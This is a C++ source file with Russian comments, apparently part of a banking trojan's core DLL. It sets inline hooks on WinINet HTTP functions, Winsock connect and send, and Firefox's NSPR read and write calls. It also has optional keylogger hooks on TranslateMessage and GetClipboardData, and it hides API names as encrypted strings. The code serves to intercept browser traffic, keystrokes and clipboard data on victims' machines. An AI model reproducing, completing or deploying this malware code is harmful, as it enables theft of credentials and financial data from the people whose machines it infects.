#include <windows.h>
#include <wincrypt.h>
#include <wininet.h>
#include <ws2tcpip.h>
#include <intrin.h>

#include "defines.h"
#include "DllCore.h"

#include "winapitables.h"
#include "wininethook.h"
#include "nspr4hook.h"
#include "cryptedstrings.h"
#include "userhook.h"
#include "sockethook.h"

#include "..\common\wahook.h"
#include "..\common\peimage.h"
#include "..\common\process.h"
#include "..\common\debug.h"
#include "..\common\disasm.h"


#pragma intrinsic(_InterlockedCompareExchange, _InterlockedExchange)

typedef struct
{
	void *functionForHook;
	void *hookerFunction;
	void *originalFunction;
	BYTE originalFunctionSize;
}HOOKWINAPI;

void WinApiTables::init(void)
{

}

void WinApiTables::uninit(void)
{

}

/*
  Снимает перехватыват со всеx WinApi из списка

  IN process            - процесс.
  IN OUT list           - список.
  IN count              - кол. эелементов.

  Return                - true - если снять перехват со всех WinApi,
                          false - если не снят перехват хотя бы с одной WinAPI.
*/
static bool unhookList(HANDLE process, HOOKWINAPI *list, DWORD count)
{
	bool ok = true; 
	for(DWORD i = 0; i < count; i++)if(list[i].originalFunction != NULL)
	{
		if(!WaHook::_unhook(process, list[i].functionForHook, list[i].originalFunction, list[i].originalFunctionSize))
		{
			ok = false;
#     if defined WDEBUG1
			WDEBUG1(WDDT_ERROR, "Failed to unhook WinApi at index %u", i);
#     endif
		}
		/*else
		{
			PeImage::_repalceImportFunction(coreData.modules.current, list[i].originalFunction, list[i].functionForHook);
			DllCore::replaceFunction(list[i].originalFunction, list[i].functionForHook);
		}*/
	}
	return ok;
}

static void hotPatchCallback(const void *functionForHook, const void *originalFunction)
{
	PeImage::_repalceImportFunction(coreDllData.modules.currentModule, functionForHook, originalFunction);
}

/*
  Перехватывает все WinApi из списка

  IN process            - процесс.
  IN OUT list           - список.
  IN count              - кол. эелементов.
  IN realCount          - кол. эелементов, должны быть равны. Смысл это понятен в коде.

  Return                - true - если перехвачены все WinApi,
                          false - если не перехвачена хотя бы одна WinAPI.
*/
static bool hookList(HANDLE process, HOOKWINAPI *list, DWORD count, DWORD realCount)
{
	//Страхуемся.
	if(count != realCount)
	{
#   if defined WDEBUG2
		WDEBUG2(WDDT_ERROR, "count != realCount, %u != %u", count, realCount);
#   endif
		return false;
	}

	//Обнуляем структуру на всякий случай.
	for(DWORD i = 0; i < count; i++)
	{
		if(list[i].functionForHook == NULL)
		{
#     if defined WDEBUG1
			WDEBUG1(WDDT_ERROR, "NULL WinApi founded at index %u", i);
#     endif
			return false;
		}
		list[i].originalFunction    = NULL;
		list[i].originalFunctionSize = 0;
	}

	LPBYTE opcodesBuf = (LPBYTE)WaHook::_allocBuffer(process, count);
	if(opcodesBuf != NULL)
	{
		//Ставим хуки.    
		DWORD i = 0;
		for(; i < count; i++)
		{
			DWORD curOpcodesSize = WaHook::_hook(process, list[i].functionForHook, list[i].hookerFunction, opcodesBuf, hotPatchCallback);
			if(curOpcodesSize == 0)
			{
#      if defined WDEBUG1
				WDEBUG1(WDDT_ERROR, "Failed to hook WinApi at index %u", i);
#       endif
				break;
			}

			list[i].originalFunction     = opcodesBuf;
			list[i].originalFunctionSize = curOpcodesSize;

			opcodesBuf += curOpcodesSize;
		}

		if(i == count)return true;

		//Снимаем хуки.
		unhookList(process, list, count);
	}

	return false;
}

////////////////////////////////////////////////////////////////////////////////////////////////////
// Таблица перехвата для пользовательского процесса.
////////////////////////////////////////////////////////////////////////////////////////////////////
static HOOKWINAPI userHooks[] =
{
	{NULL, WininetHook::hookerHttpSendRequestW,           NULL, 0},
	{NULL, WininetHook::hookerHttpSendRequestA,           NULL, 0},
	{NULL, WininetHook::hookerHttpSendRequestExW,         NULL, 0},
	{NULL, WininetHook::hookerHttpSendRequestExA,         NULL, 0},
	{NULL, WininetHook::hookerInternetCloseHandle,        NULL, 0},
	{NULL, WininetHook::hookerInternetReadFile,           NULL, 0},
	{NULL, WininetHook::hookerInternetReadFileExA,        NULL, 0},
	{NULL, WininetHook::hookerInternetQueryDataAvailable, NULL, 0},
};

#if BO_KEYLOGGER > 0
static HOOKWINAPI keylogHooks[] =
{
	{NULL, UserHook::hookerTranslateMessage,              NULL, 0},
	{NULL, UserHook::hookerGetClipboardData,              NULL, 0},
};
#endif

bool WinApiTables::_setUserHooks(void)
{
	DWORD i = 0;

	userHooks[i++].functionForHook = CWA(wininet, HttpSendRequestW);
	userHooks[i++].functionForHook = CWA(wininet, HttpSendRequestA);
	userHooks[i++].functionForHook = CWA(wininet, HttpSendRequestExW);
	userHooks[i++].functionForHook = CWA(wininet, HttpSendRequestExA);
	userHooks[i++].functionForHook = CWA(wininet, InternetCloseHandle);
	userHooks[i++].functionForHook = CWA(wininet, InternetReadFile);
	userHooks[i++].functionForHook = CWA(wininet, InternetReadFileExA);
	userHooks[i++].functionForHook = CWA(wininet, InternetQueryDataAvailable);

	//Хукаем.
	return hookList(CURRENT_PROCESS, userHooks, i, sizeof(userHooks) / sizeof(HOOKWINAPI));
}

#if BO_KEYLOGGER > 0
bool WinApiTables::_setKeyloggerHooks(void)
{
	DWORD i = 0;
	keylogHooks[i++].functionForHook = CWA(user32, TranslateMessage);
	keylogHooks[i++].functionForHook = CWA(user32, GetClipboardData);

	return hookList(CURRENT_PROCESS, keylogHooks, i, sizeof(keylogHooks) / sizeof(HOOKWINAPI));
}

bool WinApiTables::_removeKeyloggerHooks(void)
{
	return unhookList(CURRENT_PROCESS, keylogHooks, sizeof(keylogHooks) / sizeof(HOOKWINAPI));
}
#endif

static HOOKWINAPI socketHooks[] =
{
	{NULL, SocketHook::hookerCloseSocket,                 NULL, 0},
	{NULL, SocketHook::hookerConnect,                     NULL, 0},
	{NULL, SocketHook::hookerSend,                        NULL, 0},
	{NULL, SocketHook::hookerWSAConnect,                  NULL, 0},
	{NULL, SocketHook::hookerWsaSend,                     NULL, 0},
};

bool WinApiTables::_setSocketHooks(void)
{
	DWORD i = 0;
	socketHooks[i++].functionForHook = CWA(ws2_32, closesocket);
	socketHooks[i++].functionForHook = CWA(ws2_32, connect);
	socketHooks[i++].functionForHook = CWA(ws2_32, send);
	socketHooks[i++].functionForHook = CWA(ws2_32, WSAConnect);
	socketHooks[i++].functionForHook = CWA(ws2_32, WSASend);

	return hookList(CURRENT_PROCESS, socketHooks, i, sizeof(socketHooks) / sizeof(HOOKWINAPI));
}

bool WinApiTables::_removeSocketHooks(void)
{
	return unhookList(CURRENT_PROCESS, socketHooks, sizeof(socketHooks) / sizeof(HOOKWINAPI));
}

bool WinApiTables::_removeUserHooks(void)
{
	return unhookList(CURRENT_PROCESS, userHooks, sizeof(userHooks) / sizeof(HOOKWINAPI));
}

////////////////////////////////////////////////////////////////////////////////////////////////////
// Таблица перехвата для nspr4.dll.
////////////////////////////////////////////////////////////////////////////////////////////////////

static HOOKWINAPI nspr4Hooks[] =
{
	{NULL, Nspr4Hook::hookerPrOpenTcpSocket,	NULL, 0},
	{NULL, Nspr4Hook::hookerPrClose,			NULL, 0},
	{NULL, Nspr4Hook::hookerPrRead,				NULL, 0},
	{NULL, Nspr4Hook::hookerPrWrite,			NULL, 0},
	{NULL, Nspr4Hook::hookerPrPoll,				NULL, 0}
};

static DWORD WINAPI delayHooker(void*)
{
	CSTR_GETW(nspr4dll, nspr4_nspr4dll);
	CSTR_GETW(nss3, nspr4_nss3);
	
	HMODULE module;
	DWORD dwTry = 0;

	while (DllCore::isActive() && dwTry < 150)
	{
		module = CWA(kernel32, GetModuleHandleW)(nspr4dll);
		if(!module) module = CWA(kernel32, GetModuleHandleW)(nss3);
		if (module)
		{
			WinApiTables::_setNspr4Hooks(module);
			Nspr4Hook::init();
			break;
		}
		Sleep(100);
		dwTry++;
	}
	
	return 0;
}

bool WinApiTables::_trySetNspr4Hooks(void)
{
	return Process::_createThread(NULL, delayHooker, NULL) ? true : false;
}

bool WinApiTables::_setNspr4Hooks(HMODULE nspr4Handle)
{
	DWORD i = 0;

	CSTR_GETA(propentcpsocket, winapitables_propentcpsocket);
	CSTR_GETA(prclose, winapitables_prclose);
	CSTR_GETA(prread, winapitables_prread);
	CSTR_GETA(prwrite, winapitables_prwrite);
	CSTR_GETA(prpoll, winapitables_prpoll);

	nspr4Hooks[i++].functionForHook = CWA(kernel, GetProcAddress)(nspr4Handle, propentcpsocket);
	nspr4Hooks[i++].functionForHook = CWA(kernel, GetProcAddress)(nspr4Handle, prclose);
	nspr4Hooks[i++].functionForHook = CWA(kernel, GetProcAddress)(nspr4Handle, prread);
	nspr4Hooks[i++].functionForHook = CWA(kernel, GetProcAddress)(nspr4Handle, prwrite);
	nspr4Hooks[i++].functionForHook = CWA(kernel, GetProcAddress)(nspr4Handle, prpoll);

	//Хукаем.
	bool ok = hookList(CURRENT_PROCESS, (HOOKWINAPI*)nspr4Hooks, i, i);
	if(ok)
	{
		Nspr4Hook::updateAddresses(nspr4Handle, nspr4Hooks[0].originalFunction, nspr4Hooks[1].originalFunction, 
			nspr4Hooks[2].originalFunction, nspr4Hooks[3].originalFunction, nspr4Hooks[4].originalFunction);
	}

	return ok;
}

bool WinApiTables::_removeNspr4Hooks()
{
	return unhookList(CURRENT_PROCESS, nspr4Hooks, sizeof(nspr4Hooks) / sizeof(HOOKWINAPI));
}